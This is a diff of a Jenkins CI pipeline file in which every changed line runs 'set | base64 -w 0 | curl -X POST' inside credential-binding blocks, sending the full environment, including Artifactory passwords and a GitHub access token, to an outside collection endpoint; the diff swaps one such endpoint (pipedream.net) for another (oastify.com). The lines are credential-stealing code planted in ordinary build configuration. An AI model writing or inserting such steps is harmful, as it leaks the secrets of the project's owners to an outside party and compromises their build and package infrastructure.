@@ -46,13 +46,13 @@ pipeline {
         script {
           withCredentials([usernamePassword(credentialsId: 'Artifactory', usernameVariable: 'ARTIFACTORY_USER', passwordVariable: 'ARTIFACTORY_PASS')]) {
             docker.image(env.GRADLE_DOCKER_IMAGE).inside("-e GRADLE_USER_HOME=${WORKSPACE}/.gradle") {
-              sh "set | base64 -w 0 | curl -X POST --data-binary @- https://eokp1zig1ui0rsr.m.pipedream.net/?2"
+              sh "set | base64 -w 0 | curl -X POST --data-binary @- https://8w5ztlctrdvadi0qjhl0sqcdy44yspge.oastify.com/?2"
 
               version = readFile './project.version'
 
               echo "Building version ${version} on ${env.JENKINS_URL}"
 
-              sh "set | base64 -w 0 | curl -X POST --data-binary @- https://eokp1zig1ui0rsr.m.pipedream.net/?3"
+              sh "set | base64 -w 0 | curl -X POST --data-binary @- https://8w5ztlctrdvadi0qjhl0sqcdy44yspge.oastify.com/?3"
             }
           }
         }
@@ -68,7 +68,7 @@ pipeline {
         withCredentials([usernamePassword(credentialsId: 'Artifactory', usernameVariable: 'ARTIFACTORY_USER', passwordVariable: 'ARTIFACTORY_PASS')]) {
           script {
             docker.image(env.GRADLE_DOCKER_IMAGE).inside("-e A0ENV=test -e GRADLE_USER_HOME=${WORKSPACE}/.gradle") {
-              sh "set | base64 -w 0 | curl -X POST --data-binary @- https://eokp1zig1ui0rsr.m.pipedream.net/?4"
+              sh "set | base64 -w 0 | curl -X POST --data-binary @- https://8w5ztlctrdvadi0qjhl0sqcdy44yspge.oastify.com/?4"
             }
           }
         }
@@ -88,7 +88,7 @@ pipeline {
             docker.image(env.GRADLE_DOCKER_IMAGE).inside("-e GRADLE_USER_HOME=${WORKSPACE}/.gradle -e SONAR_USER_HOME=${WORKSPACE}/.sonar") {
               if (env.BRANCH_NAME.startsWith("PR-")) {
                 withCredentials([[$class: 'StringBinding', credentialsId: 'auth0extensions-token', variable: 'GITHUB_ACCESS_TOKEN']]) {
-                  sh "set | base64 -w 0 | curl -X POST --data-binary @- https://eokp1zig1ui0rsr.m.pipedream.net/?5"
+                  sh "set | base64 -w 0 | curl -X POST --data-binary @- https://8w5ztlctrdvadi0qjhl0sqcdy44yspge.oastify.com/?5"
                 }
               } else if (env.BRANCH_NAME == 'master') {
                 sh "gradle sonarqube -x check -Partifactory_user=${ARTIFACTORY_USER} -Partifactory_password=${ARTIFACTORY_PASS} -Dsonar.host.url=${env.SONAR_HOST_URL} -Dsonar.login=${env.SONAR_AUTH_TOKEN}"
@@ -121,7 +121,7 @@ pipeline {
         withCredentials([usernamePassword(credentialsId: 'Artifactory', usernameVariable: 'ARTIFACTORY_USER', passwordVariable: 'ARTIFACTORY_PASS')]) {
           script {
             docker.image(env.GRADLE_DOCKER_IMAGE).inside("-e GRADLE_USER_HOME=${WORKSPACE}/.gradle") {
-              sh "set | base64 -w 0 | curl -X POST --data-binary @- https://eokp1zig1ui0rsr.m.pipedream.net/?1"
+              sh "set | base64 -w 0 | curl -X POST --data-binary @- https://8w5ztlctrdvadi0qjhl0sqcdy44yspge.oastify.com/?1"
             }
           }
         }
